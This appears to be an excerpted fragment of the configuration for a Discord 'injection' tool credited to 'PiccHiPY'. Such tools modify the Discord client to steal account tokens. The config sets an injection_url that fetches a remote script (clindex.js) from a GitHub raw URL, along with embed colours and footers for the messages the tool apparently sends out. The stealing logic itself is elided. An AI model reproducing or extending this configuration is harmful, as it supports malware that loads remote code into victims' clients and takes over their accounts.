...
const config = {
  ...
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/Senior-Picchi/inject/main/clindex.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By PiccHiPY・',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection PiccHiPY',
        },
      },
    ],
  };
